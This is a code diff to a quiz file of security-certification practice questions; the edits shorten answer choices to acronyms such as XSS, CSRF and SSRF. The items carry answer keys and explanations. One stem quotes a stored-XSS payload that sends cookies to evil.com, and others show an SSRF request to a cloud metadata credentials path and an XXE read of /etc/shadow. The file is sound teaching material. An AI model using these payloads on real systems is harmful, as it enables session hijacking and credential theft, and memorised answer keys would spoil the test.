@@ -241,9 +241,9 @@ const Q_D2 = [
   "stem": "An attacker compromises a user's session by injecting a malicious script into a web page that is then viewed by other authenticated users. The script runs in the victim's browser and silently sends their session cookie to the attacker. Which vulnerability is being exploited?",
   "opts": [
    "A. SQL injection",
-   "B. Cross-site scripting (XSS)",
-   "C. Cross-site request forgery (CSRF)",
-   "D. Server-side request forgery (SSRF)"
+   "B. XSS",
+   "C. CSRF",
+   "D. SSRF"
   ],
   "correct": 1,
   "exp": "Cross-site scripting (XSS) injects malicious JavaScript into web pages that are then rendered by other users' browsers. The script runs in the victim's browser context, giving it access to cookies, session tokens, and DOM content. Stored XSS (persistent) is saved to the database and served to all visitors. Reflected XSS is in the URL/response. CSRF (C) tricks an authenticated user's browser into making unwanted requests to the application — the attacker doesn't directly steal the cookie; they make the browser send a pre-crafted request while authenticated. SSRF (D) tricks the server into making requests to internal resources. SQL injection targets database queries. XSS = script runs in victim's browser."
@@ -776,7 +776,7 @@ const Q_D2 = [
   "stem": "An attacker compromises a vendor's email account and monitors email conversations with the target company for weeks. When a legitimate invoice is due, the attacker sends an email from the real vendor's account with modified payment details directing funds to the attacker's bank account. What type of attack is this?",
   "opts": [
    "A. Spear phishing",
-   "B. Business email compromise (BEC)",
+   "B. BEC",
    "C. Whaling",
    "D. Pretexting"
   ],
@@ -861,9 +861,9 @@ const Q_D2 = [
   "stem": "A penetration tester discovers that a web application displays user-submitted forum posts without sanitizing HTML or JavaScript. The tester submits a post containing <code>&lt;script&gt;document.location='http://evil.com/steal?c='+document.cookie&lt;/script&gt;</code>. When other users view the post, their session cookies are sent to the attacker's server. Which vulnerability is this?",
   "opts": [
    "A. SQL injection",
-   "B. Stored cross-site scripting (XSS)",
-   "C. Cross-site request forgery (CSRF)",
-   "D. Server-side request forgery (SSRF)"
+   "B. Stored XSS",
+   "C. CSRF",
+   "D. SSRF"
   ],
   "correct": 1,
   "exp": "Stored (persistent) XSS occurs when malicious scripts are permanently stored on the target server (in a database, forum post, comment) and executed in other users' browsers when they view the content. The script runs in the context of the vulnerable site, allowing cookie theft, session hijacking, and account takeover. SQL injection (A) targets the database through query manipulation. CSRF (C) forces authenticated users to perform unintended actions via forged requests. SSRF (D) tricks the server into making requests to unintended destinations. XSS prevention: input validation, output encoding, Content Security Policy (CSP) headers, and HttpOnly cookie flags."
@@ -894,8 +894,8 @@ const Q_D2 = [
   "badgeClass": "mcq-b",
   "stem": "A user is logged into their banking application. They visit a malicious website that contains a hidden form that automatically submits a fund transfer request to the banking application using the user's active session. The bank processes the transfer because the user is authenticated. Which vulnerability does this exploit?",
   "opts": [
-   "A. Cross-site scripting (XSS)",
-   "B. Cross-site request forgery (CSRF)",
+   "A. XSS",
+   "B. CSRF",
    "C. SQL injection",
    "D. Session fixation"
   ],
@@ -1581,9 +1581,9 @@ const Q_D2 = [
   "badgeClass": "mcq-b",
   "stem": "An attacker tricks a cloud-based server into making a request to an internal metadata service (169.254.169.254) to steal temporary credentials. Which vulnerability is being exploited?",
   "opts": [
-   "A. Cross-site scripting (XSS)",
+   "A. XSS",
    "B. SQL injection",
-   "C. Server-Side Request Forgery (SSRF)",
+   "C. SSRF",
    "D. Buffer overflow"
   ],
   "correct": 2,
@@ -1752,9 +1752,9 @@ const Q_D2 = [
   "stem": "A web application includes a feature that generates PDF reports by fetching content from a user-supplied URL. An attacker submits the URL <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> through this feature and successfully retrieves the cloud instance's IAM role credentials in the generated PDF. Which vulnerability was exploited?",
   "opts": [
    "A. Directory traversal",
-   "B. Server-Side Request Forgery (SSRF)",
-   "C. Cross-Site Request Forgery (CSRF)",
-   "D. XML External Entity (XXE) injection"
+   "B. SSRF",
+   "C. CSRF",
+   "D. XXE injection"
   ],
   "correct": 1,
   "exp": "Server-Side Request Forgery (SSRF) occurs when an attacker can make the server-side application send HTTP requests to an arbitrary destination chosen by the attacker. The cloud metadata endpoint (169.254.169.254) is a classic SSRF target because it exposes IAM credentials and instance configuration. (A) Directory traversal navigates the local file system using ../ sequences — it does not involve the server making outbound HTTP requests. (C) CSRF tricks a user's browser into performing unwanted actions on a site where they are authenticated — it targets the user, not the server. (D) XXE injection exploits XML parsers to read local files or make requests, but the attack vector here is a URL parameter in a PDF generator, not XML input. SSRF mitigations include allowlisting permitted URLs, blocking access to metadata endpoints, and using IMDSv2."
@@ -1802,9 +1802,9 @@ const Q_D2 = [
   "badgeClass": "mcq-b",
   "stem": "An organization wants to ensure that all mobile devices connecting to the internal network meet specific security criteria, such as being encrypted and not jailbroken. Which technology is BEST for this?",
   "opts": [
-   "A. Next-Generation Firewall (NGFW)",
-   "B. Mobile Device Management (MDM) / Unified Endpoint Management (UEM)",
-   "C. Intrusion Prevention System (IPS)",
+   "A. NGFW",
+   "B. MDM / UEM",
+   "C. IPS",
    "D. WAF"
   ],
   "correct": 1,
@@ -2092,7 +2092,7 @@ const Q_D2 = [
   "stem": "An organization wants to identify all third-party components and libraries used within their custom applications to manage supply chain risk. Which document should they request from developers?",
   "opts": [
    "A. SLA",
-   "B. SBOM (Software Bill of Materials)",
+   "B. SBOM",
    "C. NDA",
    "D. Vulnerability Scan Report"
   ],
@@ -2283,7 +2283,7 @@ const Q_D2 = [
   "stem": "An attacker compromises an employee's email account and silently creates an inbox rule that forwards all emails containing the words 'wire transfer,' 'invoice,' or 'payment' to an external address. The employee is unaware. This technique is MOST commonly associated with which attack?",
   "opts": [
    "A. Whaling",
-   "B. Business email compromise (BEC) — mailbox rule persistence",
+   "B. BEC — mailbox rule persistence",
    "C. Vishing",
    "D. Smishing"
   ],
@@ -2321,9 +2321,9 @@ const Q_D2 = [
   "stem": "A web application uses a function that processes XML input from users. An attacker submits an XML document containing an external entity declaration that references the server's <code>/etc/shadow</code> file. The server returns the contents of the shadow file in its response. Which vulnerability is being exploited?",
   "opts": [
    "A. SQL injection",
-   "B. XML External Entity (XXE) injection",
-   "C. Cross-site scripting (XSS)",
-   "D. Server-side request forgery (SSRF)"
+   "B. XXE injection",
+   "C. XSS",
+   "D. SSRF"
   ],
   "correct": 1,
   "exp": "XML External Entity (XXE) injection exploits XML parsers that process external entity declarations. The attacker defines an entity that references a local file (like /etc/shadow) or an internal URL, and the parser resolves it, including the file contents in the response. While XXE can be used to achieve SSRF-like outcomes (D), the root vulnerability is the insecure XML parsing, not forged server requests. SQL injection (A) targets databases. XSS (C) injects client-side scripts. XXE prevention: disable external entity processing in XML parsers, use JSON instead of XML where possible, validate and sanitize XML input, and apply least privilege to the XML parser process."
